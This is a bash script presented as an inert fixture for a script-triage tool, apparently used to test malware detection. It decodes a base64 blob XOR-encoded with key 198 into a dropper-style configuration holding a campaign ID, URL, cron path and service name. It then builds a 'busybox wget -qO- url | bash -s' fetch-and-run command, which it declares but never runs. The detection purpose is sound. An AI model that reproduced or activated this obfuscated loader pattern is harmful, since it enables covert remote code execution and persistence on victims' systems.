#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_fc8b5fe9='sPv3urWyo7a1+6elt7OvtKOZtKOrqbKj6qKvtbansqWumbavtqO6p6KntrKjtPuks7''W/pKm+mbGho7KZtbKiqbOyurWyp6GjmaWps6iy+/e6paertqevoaiZr6L7paertqev''oajr//b/pKXz/qD+orqztKr7rrKytrX86en/9v+kpfP+oP6i6KO+p6u2qqPor6iwp6''qvoun/9/D2ovCj9Oi1rrqztaO0maeho6iy+46zqLK0o7W1iqek6f/2/6Sl8/6g/qI='
  readonly Codec_fc8b5fe9='base64_chunks|single_byte_xor|c6'

  Load_fc8b5fe9() {
    stored_bytes=()
    local encoded_part
    while read -r encoded_part; do [[ -n "$encoded_part" ]] && stored_bytes+=("$encoded_part"); done < <(printf '%s' "${Material_fc8b5fe9}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
  }

  Decode_fc8b5fe9() {
    recovered_bytes=()
    local byte_index
    for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do
      recovered_bytes+=("$((stored_bytes[byte_index] ^ 198))")
    done
  }

  Recover_fc8b5fe9() {
    local -a stored_bytes recovered_bytes
    local configuration_text harmless_value decode_pass byte_index
    harmless_value="${HUNTRESS_FIXTURE_CONTEXT:-host}"
    Load_fc8b5fe9
    if ! Decode_fc8b5fe9; then return 71; fi
    configuration_text=''
    local octal character
    for byte_index in "${!recovered_bytes[@]}"; do
      printf -v octal '%03o' "${recovered_bytes[byte_index]}"
      printf -v character '%b' "\\$octal"
      configuration_text+="$character"
    done
    printf '%s\n' "$configuration_text"
  }

  Inspect_fc8b5fe9() { local recovered; recovered="$(Recover_fc8b5fe9)"; printf '%s\n' "$recovered"; }

  Plan_fc8b5fe9() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_fc8b5fe9)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(busybox wget -qO- "$url")
    local -a interpreter=(bash -s)
    declare -p request_command interpreter
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_fc8b5fe9; fi
